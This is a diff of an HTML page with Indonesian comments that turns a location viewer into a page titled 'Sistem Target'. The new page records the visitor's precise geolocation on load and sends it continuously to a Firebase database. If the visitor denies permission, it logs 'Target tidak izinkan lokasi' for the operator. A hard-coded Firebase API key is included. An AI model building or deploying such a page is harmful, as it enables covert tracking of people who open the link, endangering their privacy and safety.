@@ -3,10 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Monitor</title>
-    <script src="https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js"></script>
-    <script>
+    <title>Sistem Target</title>
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js';
+        import { getDatabase, ref, set, remove } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
+
         // Konfigurasi Firebase Anda
         const firebaseConfig = {
             apiKey: "AIzaSyDgPYGXqbBXt1NayhNB5M-8mjXfGKrOzWM",
@@ -19,36 +20,63 @@
         };
 
         // Inisialisasi Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
 
-        const locationRef = database.ref('devices/device1'); // Ganti dengan ID perangkat unik
-        const notificationRef = database.ref('notifications/device1'); // Ganti dengan ID perangkat unik
-
-        // Mengamati perubahan data lokasi
-        locationRef.on('value', (snapshot) => {
-            const data = snapshot.val();
-            if (data) {
-                const lat = data.latitude;
-                const lon = data.longitude;
-                document.getElementById('location').innerHTML = 
-                    `Latitude: ${lat}<br>Longitude: ${lon}`;
+        // Fungsi untuk mendapatkan lokasi
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(showPosition, showError, {
+                    enableHighAccuracy: true
+                });
             } else {
-                document.getElementById('location').innerHTML = "Menunggu lokasi...";
+                alert("Geolocation is not supported by this browser.");
             }
-        });
+        }
 
-        // Mengamati notifikasi dari Firebase
-        notificationRef.on('value', (snapshot) => {
-            const notification = snapshot.val();
-            if (notification && notification.message) {
-                alert(notification.message);
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Mengirim data lokasi ke Firebase
+            const locationRef = ref(database, 'devices/device1'); // ID perangkat unik
+            set(locationRef, {
+                latitude: lat,
+                longitude: lon,
+                timestamp: Date.now()
+            });
+
+            // Menghapus pesan penolakan izin (jika ada)
+            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
+            remove(notificationRef);
+        }
+
+        function showError(error) {
+            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    set(notificationRef, {
+                        message: "Target tidak izinkan lokasi"
+                    });
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
             }
-        });
+        }
+
+        // Mulai mendapatkan lokasi saat halaman dimuat
+        window.onload = getLocation;
     </script>
 </head>
 <body>
-    <h1>Sistem Monitor</h1>
-    <div id="location">Menunggu lokasi...</div>
+    <h1>Sistem Target</h1>
+    <p>Memantau lokasi perangkat...</p>
 </body>
 </html>
